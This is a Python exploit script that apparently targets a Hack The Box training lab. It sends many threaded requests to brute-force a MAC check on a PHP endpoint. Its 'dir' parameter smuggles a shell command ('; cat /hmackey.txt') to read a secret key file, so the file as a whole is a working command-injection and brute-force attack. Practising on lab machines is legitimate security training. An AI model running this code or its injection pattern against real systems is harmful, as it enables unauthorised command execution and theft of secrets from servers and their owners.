import requests
import sys
import concurrent.futures
import signal
import threading
from urllib.parse import urlencode

URL = "http://83.136.254.158:45846/dir.php"
COOKIES = {"PHPSESSID": "3rri57s6j0jh2a40j7o6b11avp"}
PROXY = "http://127.0.0.1:8080"

DIR = "/home/htb-stdnt/; cat /hmackey.txt"
MAC = 0
MAX_NONCE = 50000
NUM_THREADS = 40

proxies = {
    "http": PROXY,
    "https": PROXY,
}

stop_event = threading.Event()

def prepare_params(nonce):
    params = {
        "dir": DIR,
        "nonce": nonce,
        "mac": MAC,
    }
    return urlencode(params)

def make_request(nonce):
    if stop_event.is_set():
        return False
    try:
        r = requests.get(URL, cookies=COOKIES, params=prepare_params(nonce), proxies=proxies)
        if not "Error! Invalid MAC" in r.text:
            print("Found valid MAC:")
            print(r.url)
            stop_event.set()
            return True
    except requests.RequestException as e:
        print(f"Request failed for nonce {nonce}: {e}")
    return False

def signal_handler(signal, frame):
    print("Interrupted! Exiting gracefully.")
    stop_event.set()
    sys.exit(0)

def main():
    signal.signal(signal.SIGINT, signal_handler)
    with concurrent.futures.ThreadPoolExecutor(max_workers=NUM_THREADS) as executor:
        futures = {executor.submit(make_request, n): n for n in range(MAX_NONCE)}
        for future in concurrent.futures.as_completed(futures):
            if stop_event.is_set():
                executor.shutdown(wait=False)
                break

if __name__ == "__main__":
    main()
